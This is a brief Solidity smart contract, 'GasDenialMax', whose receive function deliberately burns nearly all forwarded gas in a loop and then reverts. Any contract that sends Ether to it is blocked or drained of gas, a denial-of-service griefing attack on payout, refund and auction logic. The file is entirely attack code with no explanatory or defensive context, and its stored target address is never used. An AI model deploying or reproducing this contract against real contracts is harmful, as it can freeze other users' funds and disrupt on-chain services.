pragma solidity ^0.8.0;

contract GasDenialMax {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        uint256 gasRemaining = gasleft();
        while (gasleft() > 2300) {
            for (uint256 i = 0; i < 10; i++) {
                // Generate gas consumption through mathematical operations
                gasRemaining = gasleft();
                assembly {
                    gasRemaining := shl(gasRemaining, 2)
                }
            }
        }
        revert();
    }
}